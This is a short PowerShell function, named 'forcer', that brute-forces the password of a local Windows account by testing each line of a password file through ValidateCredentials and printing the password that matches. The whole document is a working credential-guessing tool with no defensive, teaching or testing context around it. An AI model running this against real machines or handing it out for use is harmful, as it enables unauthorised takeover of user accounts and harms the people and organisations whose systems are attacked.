Function forcer {
  param($user, $passwordFile)
  Add-Type -AssemblyName System.DirectoryServices.AccountManagement 
  $accountManager = [DirectoryServices.AccountManagement.PrincipalContext]::new([DirectoryServices.AccountManagement.ContextType]::Machine)
  foreach($password in (gc $passwordFile)) {
    echo "Trying password $password"
    if ($accountManager.ValidateCredentials($user, $password)) {
      echo "Password for $user account found: $password"
      return
    }
  }
}
